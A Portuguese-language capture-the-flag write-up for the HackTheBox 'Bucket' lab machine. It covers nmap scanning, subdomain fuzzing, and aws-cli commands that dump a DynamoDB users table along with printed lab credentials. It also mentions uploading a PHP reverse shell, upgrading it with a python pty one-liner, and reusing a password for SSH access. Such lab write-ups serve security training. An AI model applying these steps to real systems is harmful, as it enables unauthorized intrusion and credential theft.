<html>
 <body>
  <script src="https://www.hackthebox.eu/badge/148108"></script>
 </body>
 </html>


Back to all write-ups: [here](https://repo4chu.github.io/hackthebox/)


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Bucket - HackTheBox - WriteUp
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
![image](https://i.imgur.com/Y1obslX.png)

**Tools** utilizadas:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
nmap
awscli
curl
wfuzz
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=1/4%OT=22%CT=1%CU=36786%PV=Y%DS=2%DC=T%G=Y%TM=5FF34D45
OS:%P=i686-pc-windows-windows)SEQ(SP=FD%GCD=1%ISR=104%TI=Z%CI=Z%II=I%TS=A)O
OS:PS(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DS
OS:T11NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)E
OS:CN(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F
OS:=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5
OS:(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z
OS:%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=
OS:N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%
OS:CD=S)

Uptime guess: 41.328 days (since Tue Nov 24 06:23:01 2020)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=253 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 53/tcp)
HOP RTT       ADDRESS
1   190.00 ms 10.10.14.1
2   192.00 ms bucket.htb (10.10.10.212)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Ao acessar a porta 80, somos redirecionados para o dominio: bucket.htb
Portanto, vamos adiciona-lo no arquivo de hosts
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
echo 'bucket.htb  10.10.10.212' >> /etc/hosts
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Após isso conseguimos acessar a página web, após alguns testes, não foi possível encontrar outros diretórios e arquivos.

![Image](https://i.imgur.com/Wsd50kp.png)

Ao analisar o código fonte, podemos ver que possuimos um subdomain (s3):
![Image](https://i.imgur.com/tXc0CNj.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
http://s3.bucket.htb/
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Vamos tentar encontrar diretorios nele com o wfuzz:
![Image](https://i.imgur.com/VppmJzb.png)

Podemos encontrar 2 diretórios:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
health
shell
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Ao acessar o diretório shell, podemos perceber o serviço 'DynamoDB'.
![Image](https://i.imgur.com/RXhjaJf.png)


Para interagir com esse serviço, vamos utilizar a tool da própria AWS, conhecida como aws-cli

Após algumas horas lendo documentações, finalmente temos o comando correto para interagir:

![Image](https://i.imgur.com/Kiz6WsO.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
aws dynamodb list-tables --endpoint-url http://s3.bucket.htb/
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

e b00m, temos o nome da tabela que está rodando lá :D
Vamos ver se conseguimos credenciais;


![Image](https://i.imgur.com/P3J8y29.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
aws dynamodb scan --table-name users --endpoint-url http://s3.bucket.htb/
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Temos credenciais :D
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Mgmt:Management@#1@#
Cloudadm:Welcome123!
Sysadm:n2vM-<_K_Q:.Aa2
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Ao tentar valida-las via SSH, nenhum login foi possível

Listando os arquivos:

![Image](https://i.imgur.com/updbyQp.png)

Após isso, tentamos fazer o upload de uma reverse shell para o servidor.
No nosso caso vamos utilizar a [shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell) do 'Pentest Monkeys' 

![Image](https://i.imgur.com/VLLIuAS.png)

w00t temos uma shell como www-data, vamos tentar melhorar nossa shell com python

![Image](https://i.imgur.com/24FbvOg.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
python3 -c 'import pty;pty.spawn("/bin/bash")'
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Com isso, temos uma shell interativa e encontramos um novo usuário chamado 'Roy'
Portanto podemos testar as senhas já obtidas previamente para este usuário.

ee entãoo:

![Image](https://i.imgur.com/me6RqLL.png)

Agora vamos melhorar nossa shell logando via SSH com o usuário 'Roy'
![Image](https://i.imgur.com/0q73Xnv.png)

